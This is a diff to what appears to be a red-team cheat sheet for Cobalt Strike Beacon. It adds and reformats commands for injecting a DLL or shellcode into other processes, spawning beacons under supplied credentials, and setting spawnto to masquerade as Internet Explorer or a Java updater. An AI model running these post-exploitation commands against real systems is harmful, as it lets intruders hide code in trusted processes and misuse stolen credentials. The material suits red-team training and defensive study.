@@ -12,11 +12,19 @@ Search Tag(s): #cobalt-strike #command-and-control
 
 `beacon> psinject <pid> <arch> <cmdlet> [args]`
 
+- Inject DLL file in another process
+
+`beacon> dllload <pid> c:\path\to\remove\shell.dll`
+
 ## 6.2 - Inject Shellcode
 
 * Inject shellcode
 
 `beacon> shinject <pid> /path/to/shellcode.bin`
+
+- Spawn a new process and inject shellcode
+
+`beacon> shspawn x64`
 
 * Spawn shellcode and tunnel
 
@@ -30,15 +38,27 @@ Search Tag(s): #cobalt-strike #command-and-control
 
 ## 6.4 - Spawn Beacon Session
 
-`beacon> spawnas <domain_name>\<username> <password>`
+- Spawn new beacon process with under different user credentials as provided
 
-`beacon> spawnto <arch> <path> <args>`
+```
+beacon> spawnas <domain_name>\<username> <password>
+```
 
-`beacon> spawnto x86 c:\program files (x86)\internet explorer\iexplore.exe`
+- Specify a path of the new executable program to inject beacon shellcode other than specified in the malleable c2 profile. By default it injects `rundll32.exe` when executing `spawn`.
 
-`beacon> spawnto x86 C:\Program Files (x86)\Common Files\Java\Java Update\jucheck.exe`
+```
+beacon> spawnto <arch> <path> <args>
 
-`beacon> spawn <arch> <listener>`
+beacon> spawnto x86 c:\program files (x86)\internet explorer\iexplore.exe
+
+beacon> spawnto x86 C:\Program Files (x86)\Common Files\Java\Java Update\jucheck.exe
+```
+
+- Spawn new beacon process
+
+```
+beacon> spawn <arch> <listener>
+```
 
 ---
 ## References
